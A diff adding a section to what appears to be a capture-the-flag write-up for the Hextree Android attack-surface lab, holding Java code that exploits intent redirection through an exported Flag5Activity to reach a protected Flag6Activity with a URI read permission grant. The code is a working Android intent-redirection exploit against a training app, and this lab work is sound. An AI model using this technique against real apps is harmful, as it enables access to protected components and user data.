@@ -230,3 +230,81 @@ adb shell am start \
   -a REOPEN
 ```
 
+# Flag6Activity
+
+```
+package com.example.hextree;  
+  
+import android.content.ComponentName;  
+import android.content.Intent;  
+import android.os.Bundle;  
+import android.view.View;  
+import android.widget.Button;  
+  
+import androidx.appcompat.app.AppCompatActivity;  
+  
+public class MainActivity extends AppCompatActivity {  
+  
+    @Override  
+    protected void onCreate(Bundle savedInstanceState) {  
+  
+        super.onCreate(savedInstanceState);  
+        setContentView(R.layout.activity_main);  
+  
+        Button btn = findViewById(R.id.btn_launch_activity);  
+  
+        btn.setOnClickListener(new View.OnClickListener() {  
+  
+            @Override  
+            public void onClick(View v) {  
+  
+                /*  
+                 * Intent redirected by Flag5Activity                 */                Intent redirectIntent = new Intent();  
+  
+                redirectIntent.setComponent(  
+                        new ComponentName(  
+                                "io.hextree.attacksurface",  
+                                "io.hextree.attacksurface.activities.Flag6Activity"  
+                        )  
+                );  
+  
+                // IMPORTANT:  
+                // makes Flag5Activity call startActivity()                redirectIntent.putExtra("reason", "next");  
+  
+                // IMPORTANT:  
+                // required by Flag6Activity                redirectIntent.addFlags(  
+                        Intent.FLAG_GRANT_READ_URI_PERMISSION  
+                );  
+  
+                /*  
+                 * Nested Parcelable Intent                 */                Intent nestedIntent = new Intent();  
+  
+                nestedIntent.putExtra("return", 42);  
+  
+                nestedIntent.putExtra(  
+                        "nextIntent",  
+                        redirectIntent  
+                );  
+  
+                /*  
+                 * Exported activity                 */                Intent triggerIntent = new Intent();  
+  
+                triggerIntent.setComponent(  
+                        new ComponentName(  
+                                "io.hextree.attacksurface",  
+                                "io.hextree.attacksurface.activities.Flag5Activity"  
+                        )  
+                );  
+  
+                triggerIntent.putExtra(  
+                        "android.intent.extra.INTENT",  
+                        nestedIntent  
+                );  
+  
+                startActivity(triggerIntent);  
+            }  
+        });  
+    }  
+}
+```
+
